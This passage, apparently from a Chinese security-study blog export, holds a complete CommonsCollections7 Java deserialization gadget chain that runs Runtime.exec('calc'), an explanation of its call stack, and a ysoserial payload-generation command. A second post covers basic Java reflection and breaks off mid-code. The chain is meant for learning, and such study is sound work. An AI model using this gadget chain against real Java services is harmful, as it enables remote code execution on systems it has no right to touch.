class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Apache_Common_Collections.cc_1_7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections7</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException &#123;<br><br>        Transformer[] fakeTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//ChainedTransformer实例</span><br>        <span class="hljs-comment">//先设置假的 Transformer 数组，防止生成时执行命令</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformer);<br><br>        <span class="hljs-comment">//LazyMap实例</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-string">&quot;test&quot;</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-string">&quot;test&quot;</span>);<br><br><br>        <span class="hljs-comment">//通过反射设置真的 ransformer 数组</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br><br>        <span class="hljs-comment">//上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除</span><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashtable);<br>        oos.flush();<br>        oos.close();<br><br>        <span class="hljs-comment">//测试反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里需要重复2次重复的添加到<code>Hashtable</code>的操作</p><p><code>Hashtable</code>的<code>reconstitutionPut</code>方法是被遍历调用的</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032255026.png" alt="image-20230124191526657"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032256026.png" alt="image-20230124191546132"></p><p>第一次调用的时候，并不会走入到<code>reconstitutionPut</code>方法for循环里面，因为<code>tab[index]</code>的内容是空的，在下面会对<code>tab[index]</code>进行赋值。在第二次调用<code>reconstitutionPut</code>时，tab中才有内容，我们才有机会进入到这个for循环中，从而调用<code>equals</code>方法。这也是为什么要调用两次put的原因。</p></blockquote><p>大体调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span><br>  -&gt;Hashtable.readObject()<br>      -&gt;Hashtable.reconstitutionPut()<br>            -&gt;AbstractMapDecorator.equals<br>                -&gt;AbstractMap.equals()<br>                  -&gt;LazyMap.get.get()<br>                    -&gt;ChainedTransformer.transform()<br>                      -&gt;ConstantTransformer.transform()<br>                        -&gt;InvokerTransformer.transform()<br>                          -&gt;…………<br></code></pre></td></tr></table></figure><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>在java反序列化上有一个里程碑式的工具 <a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p>反序列化漏洞在各个语言里本不是一个新鲜的名词，但2015年Gabriel Lawrence (@gebl)和ChrisFrohoff (@frohoff)在AppSecCali上提出了利用Apache Commons Collections来构造命令执⾏的利用链，并在年底因为对Weblogic、JBoss、Jenkins等著名应用的利用，一石激起千层浪，彻底打开了一片Java安全的蓝海。</p><p>而<strong>ysoserial</strong>就是两位原作者在此议题中释出的一个工具，它可以让用户根据自己选择的利用链，生成反序列化利用数据，通过将这些数据发送给目标，从⽽而执⾏用户预先定义的命令。什么是利用链？</p><p>利用链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将gadget理解为一种方法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP里可能是 __desctruct 到 eval ；如果你没学过其他语言的反序列化漏洞，那么gadget就是一种生成POC的方法罢了。</p><p>ysoserial的使用也很简单，虽然我们暂时先不理解 CommonsCollections ，但是用ysoserial可以很容易地生成这个gadget对应的POC：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;<br></code></pre></td></tr></table></figure><p>如上，ysoserial大部分的gadget的参数就是一条命令，比如这里是 id 。生成好的POC发送给目标，如果目标存在反序列化漏洞，并满⾜足这个gadget对应的条件，则命令 id 将被执⾏</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2022/08/23/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/08/23/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA反射"><a href="#JAVA反射" class="headerlink" title="JAVA反射"></a>JAVA反射</h1><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="类加载-x2F-类初始化"><a href="#类加载-x2F-类初始化" class="headerlink" title="类加载&#x2F;类初始化"></a>类加载&#x2F;类初始化</h3><p>三个步骤</p><ul><li><p>类的加载： 将class文件读入内存，并为之创建一个java.lang.Class对象</p><blockquote><p>任何类被使用时，系统都会为之建立一个java.lang.Class对象</p><p><strong>系统中所有的类都是java.lang.Class的实例。</strong></p></blockquote></li><li><p>类的连接</p><ul><li>验证阶段：检验被加载类是否有正确的内部结构，并和其他类协调一致</li><li>准备阶段：负责为类的类变量分配内存，并设置默认初始化值</li><li>解析阶段：将类的二进制数据中的符号引用替换为直接引用</li></ul></li><li><p>类的初始化：主要是对类变量初始化</p><ul><li>假如该类还没被加载和连接，则先加载并连接该类</li><li>假如该类的直接父类还没被初始化，先初始化其直接父类(会向上递归，java中最先初始化的是Object类)</li><li>假如类中有初始化语句，则系统依次执行这些初始化语句</li></ul></li></ul><blockquote><p>类的初始化时机：</p><ul><li>创建类的实例</li><li>调用类的类方法</li><li>访问类或接口的类变量，或为该类变量赋值</li><li>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</li><li>初始化某个类的子类</li><li>直接使用java.exe命令来运行某个主类</li></ul></blockquote><h3 id="类加载器-1"><a href="#类加载器-1" class="headerlink" title="类加载器"></a>类加载器</h3><p>作用</p><ul><li>将.class文件加载到内存中，并为之生成对应的java.lang.Class对象</li></ul><h3 id="java虚拟机的类加载机制"><a href="#java虚拟机的类加载机制" class="headerlink" title="java虚拟机的类加载机制"></a>java虚拟机的类加载机制</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032250456.jpg" alt="image-20220715194607363"></p><blockquote><p>内置类加载器</p><p>Bootstrap class loader–&gt;Platform class loader–&gt;System class loader </p><p>父到子的顺序</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032251426.jpg" alt="image-20220715195009312"></p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>指在运行时获取一个类的变量和方法信息，然后通过获取到的信息来创建对象，调用方法的一种机制。由于这种动态性，程序不用在编译器就完成确定，在运行起仍可以拓展</p><h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><ul><li>使用类的class属性，e.g. <code>Student.class</code></li><li>调用类的getClass()方法（这是Object类的方法，所有对象都有该方法）</li><li>Class类中的静态方法，forName(String className)，该方法要传入字符串参数，该字符串是某个类的全路径，也就是完整包名的路径</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;Student&gt; c1=Student.class;<br>System.out.println(c1);<br>Class&lt;Student&gt; c2=Student.class;<br>System.out.println(c1==c2);<span class="hljs-comment">//true，一个类在内存中只有一个字节码对象</span><br>Student s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Student</span>&gt; c3=s.getClass();<br>System.out.println(c1==c3);<span class="hljs-comment">//true</span><br>Class&lt;?&gt; c4=Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<span class="hljs-comment">//forName要抛出异常ClassNotFoundException</span><br>System.out.println(c1==c4);<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><h3 id="反射构造方法"><a href="#反射构造方法" class="headerlink" title="反射构造方法"></a>反射构造方法</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032251807.jpg" alt="image-20220715214817907"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射构造方法并使用</span><br>Class&lt;?&gt; c=Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<br><span class="hljs-comment">//得到所有public权限构造函数（私有默认的不能）</span><br>Constructor&lt;?&gt;[] cons=c.getConstructors();<br><span class="hljs-keyword">for</span>(Constructor con:cons)&#123;<br>  System.out.println(con);<br>&#125;<br>Constructor&lt;?&gt;[] cons2=c.getDeclaredConstructors();<span class="hljs-comment">//得到所有权限的构造函数</span><br><span class="hljs-keyword">for</span>(Constructor con:cons2)<br>&#123;<br>  System.out.println(con);<br>&#125;<br><span class="hljs-comment">//获得指定构造函数</span><br><span class="hljs-comment">//参数</span><br>Constructor&lt;?&gt; con=c.getConstructor();<span class="hljs-comment">//得到单个构造方法</span><br><span class="hljs-comment">//提供单个构造函数信息和访问权限</span><br>Object obj=con.newInstance();<span class="hljs-comment">//根据构造方法创建对象</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure><blockquote><p>基本数据类型也可以通过.class方法得到class对象，getConstructor方法需要传入的参数都是class类型，并且是当前想要访问的构造方法的形参</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射练习</span><br>Class&lt;?&gt; c=Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<br><span class="hljs-comment">//public Student(String name, int age,String address);</span><br>Constructor&lt;?&gt; con = c.getConstructor(String.class, <span class="hljs-type">int</span>.class, String.class);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> con.newInstance(<span class="hljs-string">&quot;sqhy&quot;</span>, <span class="hljs-number">4781</span>, <span class="hljs-string">&quot;339&quot;</span>);<br>System.out.println(obj);<br><span class="hljs-comment">//访问私有构造函数</span><br><span class="hljs-comment">//实现 Student s=new Student(&quot;sqhy&quot;);System.out.println(s);</span><br>Class&lt;?&gt; c1=Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<br><span class="hljs-comment">//private Student(String name);</span><br>Constructor&lt;?&gt; con1=c1.getDeclaredConstructor(String.class);<br><span class="hljs-comment">//暴力反射</span><br><span class="hljs-comment">//public void setAccessible (boolean flag):值为true时，取消访问检查</span><br>con1.setAccessible(<span class="hljs-literal">true</span>);<br>Object obj1=con1.newInstance(<span class="hljs-string">&quot;sqhy&quot;</span>);<br>System.out.println(obj1);<br></code></pre></td></tr></table></figure><blockquote><ul><li>getDeclaredConstructor可获取所有访问权限的构造方法</li><li>getConstructor只能得到public权限的构造方法</li></ul><p>遍历数组简便写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(Field filed: fields)&#123;<br>    System.out.println(filed);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h3 id="通过反射得到成员变量"><a href="#通过反射得到成员变量" class="headerlink" title="通过反射得到成员变量"></a>通过反射得到成员变量</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032251759.jpg" alt="image-20220716012613059"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射获取成员变量</span><br>Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<br><span class="hljs-comment">//getFields方法，获取该Class对象表示的类或接口的所有可访问的public字段</span><br><span class="hljs-comment">//getDeclaredFields方法，获取该Class对象表示的类或接口的所有字段</span><br>Field[] fields = c.getFields();<br><span class="hljs-keyword">for</span>(Field filed: fields)&#123;<br>  System.out.println(filed);<span class="hljs-comment">//只得到public的变量</span><br>&#125;<br>Field[] fields1 = c.getDeclaredFields();<br><span class="hljs-keyword">for</span>(Field f:fields1)<br>&#123;<br>  System.out.println(f);<span class="hljs-comment">//得到所有成员变量</span><br>&#125;<br><span class="hljs-comment">//根据指定名称</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">ad</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;address&quot;</span>);<span class="hljs-comment">//要抛出异常</span><br>Constructor&lt;?&gt; con = c.getConstructor();<br>Object obj=con.newInstance();<br>ad.set(obj,<span class="hljs-string">&quot;339&quot;</span>);<span class="hljs-comment">//给obj的成员变量ad赋值为&quot;339&quot;</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//练习</span><br>Class&lt;?&gt; c=Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<br>Constructor&lt;?&gt; con = c.getConstructor();<br>Object obj=con.newInstance();<br><span class="hljs-comment">//name是私有成员</span><br>Field namef=c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>namef.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//取消访问检查</span><br>namef.set(obj,<span class="hljs-string">&quot;sqhy&quot;</span>);<br>System.out.println(obj);<br><span class="hljs-type">Field</span> <span class="hljs-variable">agef</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>agef.setAccessible(<span class="hljs-literal">true</span>);<br>agef.set(obj,<span class="hljs-number">4781</span>);<br>System.out.println(obj);<br><span class="hljs-type">Field</span> <span class="hljs-variable">addressf</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;address&quot;</span>);<br>addressf.setAccessible(<span class="hljs-literal">true</span>);<br>addressf.set(obj,<span class="hljs-string">&quot;339&quot;</span>);<br>System.out.println(obj);<br></code></pre></td></tr></table></figure><h3 id="反射获取成员方法"><a href="#反射获取成员方法" class="headerlink" title="反射获取成员方法"></a>反射获取成员方法</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032251236.jpg" alt="image-20220716014440272"></p><blockquote><p>注：<code>getDeclaredMethods</code>方法只有本类的所有方法，没有由类或接口声明的对象以及从超类或超级接口继承的类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射获取成员方法</span><br>Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<br>Method[] methods = c.getMethods();<br><span class="hljs-keyword">for</span>(Method m:methods) &#123;<br>  System.out.println(m);<span class="hljs-comment">//所有public方法，以及由类或接口声明的对象以及从超类或超级接口继承的类</span><br>&#125;<br>Method[] methods1 = c.getDeclaredMethods();<br><span class="hljs-keyword">for</span>(Method m:methods1) &#123;<br>  System.out.println(m);<span class="hljs-comment">//只有本类的所有方法，没有由类或接口声明的对象以及从超类或超级接口继承的类</span><br>&#125;<br>System.out.println(<span class="hljs-string">&quot;---------&quot;</span>);<br><span class="hljs-comment">//获取单个</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;method1&quot;</span>);<br><span class="hljs-comment">//获取无参构造方法创建对象并调用method1方法</span><br>Constructor&lt;?&gt; con = c.getConstructor();<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> con.newInstance();<br><span class="hljs-comment">//Object invoke(Object obj,Object...args) 在具有指定参数的指定对象上调用方法</span><br><span class="hljs-comment">//Object 返回值类型</span><br><span class="hljs-comment">//obj调用方法的对象</span><br><span class="hljs-comment">//args 方法所需的参数</span><br>m.invoke(obj);<span class="hljs-comment">//method1没有参数,成功调用类method1方法</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//练习</span><br>Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;com.itheima.Student&quot;</span>);<br>Constructor&lt;?&gt; con = c.getConstructor();<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> con.newInstance();<br><span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;method1&quot;</span>);<br>m1.invoke(obj);<span class="hljs-comment">//obj.method1()</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;method2&quot;</span>, String.class);<br>m2.invoke(obj,<span class="hljs-string">&quot;sqhy&quot;</span>);<span class="hljs-comment">//obj.method2()</span><br><span class="hljs-comment">//调用有返回值的方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m3</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;method3&quot;</span>, String.class, <span class="hljs-type">int</span>.class);<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> m3.invoke(obj, <span class="hljs-string">&quot;sqhy&quot;</span>, <span class="hljs-number">4781</span>);<br>System.out.println(o);<br><span class="hljs-comment">//私有方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m4</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;function&quot;</span>);<br>m4.setAccessible(<span class="hljs-literal">true</span>);<br>m4.invoke(obj);<br></code></pre></td></tr></table></figure><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><ul><li><p>在ArrayList<Integer>中插入一个字符串数据–越过泛型检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList&lt;Integer&gt; array=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt;();<br>array.add(<span class="hljs-number">10</span>);<br>array.add(<span class="hljs-number">20</span>);<br><span class="hljs-comment">//array.add(&quot;asa&quot;);//报错</span><br>System.out.println(array);<span class="hljs-comment">//[10, 20]</span><br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&gt; c = array.getClass();<br><span class="hljs-comment">//获取到原始方法，从而绕过泛型检查</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;add&quot;</span>, Object.class);<br>m.invoke(array,<span class="hljs-string">&quot;hello&quot;</span>);<br>m.invoke(array,<span class="hljs-string">&quot;sqhy&quot;</span>);<br>m.invoke(array,<span class="hljs-string">&quot;zql&quot;</span>);<br>System.out.println(array);<br></code></pre></td></tr></table></figure></li><li><p>运行配置文件运行类的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 配置文件</span><br><span class="hljs-comment">class.txt</span><br><span class="hljs-comment">className=xxx</span><br><span class="hljs-comment">methodName=xxx</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* className=com.itheima.S</span><br><span class="hljs-comment">methodName=study</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//加载数据</span><br>Properties prop=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>FileReader fr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">&quot;./class.txt&quot;</span>);<span class="hljs-comment">//相对路径，这里.表示总文件夹（src的上一级）</span><br>prop.load(fr);<br>fr.close();<br><span class="hljs-comment">//通过键名获取值</span><br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> prop.getProperty(<span class="hljs-string">&quot;className&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> 